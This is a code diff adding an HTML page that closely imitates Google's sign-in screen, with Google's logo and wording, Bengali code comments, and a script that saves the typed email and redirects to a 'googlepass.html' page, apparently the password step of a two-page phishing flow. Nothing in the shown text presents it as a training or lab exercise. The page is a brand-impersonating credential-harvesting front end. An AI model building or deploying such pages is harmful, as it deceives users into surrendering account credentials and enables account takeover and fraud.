@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Sign In</title>
+    <link rel="icon" type="image/png" href="google.png">
+    <style>
+        /* বেসিক রিসেট */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Roboto', Arial, sans-serif;
+        }
+
+        body {
+            background-color: #fff;
+            display: flex;
+            justify-content: center;
+            min-height: 100vh;
+        }
+
+        /* মূল কন্টেইনার */
+        .container {
+            width: 100%;
+            max-width: 400px; /* মোবাইলের মতো সাইজ */
+            padding: 24px;
+            margin-top: 20px;
+        }
+
+        /* গুগল লোগো */
+        .logo {
+            text-align: center;
+            margin-bottom: 10px;
+        }
+        .logo img {
+            width: 75px;
+            height: auto;
+        }
+
+        /* হেডিং সেকশন */
+        h1 {
+            text-align: center;
+            font-weight: 400;
+            font-size: 24px;
+            color: #202124;
+            margin-bottom: 10px;
+        }
+
+        .subtitle {
+            text-align: center;
+            font-size: 16px;
+            color: #202124;
+            line-height: 1.5;
+            margin-bottom: 5px;
+        }
+
+        .learn-more {
+            display: block;
+            text-align: center;
+            color: #1a73e8;
+            font-weight: 500;
+            text-decoration: none;
+            font-size: 14px;
+            margin-bottom: 40px;
+        }
+
+        /* ইনপুট ফিল্ড ডিজাইন (ফ্লোটিং লেবেল সহ) */
+        .input-group {
+            position: relative;
+            margin-bottom: 8px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 13px 15px;
+            font-size: 16px;
+            border: 2px solid #1a73e8; /* একটিভ বর্ডার কালার */
+            border-radius: 4px;
+            outline: none;
+            background: transparent;
+        }
+
+        /* লেবেলটি বর্ডারের উপরে উঠানোর স্টাইল */
+        .input-group label {
+            position: absolute;
+            top: -10px;
+            left: 12px;
+            background-color: white;
+            padding: 0 5px;
+            color: #1a73e8;
+            font-size: 12px;
+            font-weight: 500;
+        }
+
+        /* ফরগট ইমেইল লিঙ্ক */
+        .forgot-email {
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 14px;
+            display: inline-block;
+            margin-bottom: 40px;
+        }
+
+        /* নিচের বাটন সেকশন */
+        .footer-actions {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 20px;
+        }
+
+        .create-account {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .next-btn {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 4px;
+            font-weight: 500;
+            font-size: 14px;
+            cursor: pointer;
+        }
+
+        .next-btn:hover {
+            background-color: #1557b0;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.3);
+        }
+
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google Logo">
+        </div>
+
+        <h1>Sign in</h1>
+        <p class="subtitle">Use your Google Account. The account will be added to this device and available to other Google apps.</p>
+        
+        <a href="#" class="learn-more">Learn more about using your account</a>
+
+        <div class="input-group">
+            <input type="email" id="email" value=""> <label for="email">Email or phone</label>
+        </div>
+
+        <a href="#" class="forgot-email">Forgot email?</a>
+
+        <div class="footer-actions">
+            <a href="#" class="create-account">Create account</a>
+            <button class="next-btn" onclick="goNext()">NEXT</button>
+        </div>
+    </div>
+
+</body>
+<script>
+    function goNext() {
+        const email = document.getElementById("email").value;
+        localStorage.setItem("userEmail", email);
+        window.location.href = "googlepass.html";
+    }
+</script>
+</html>
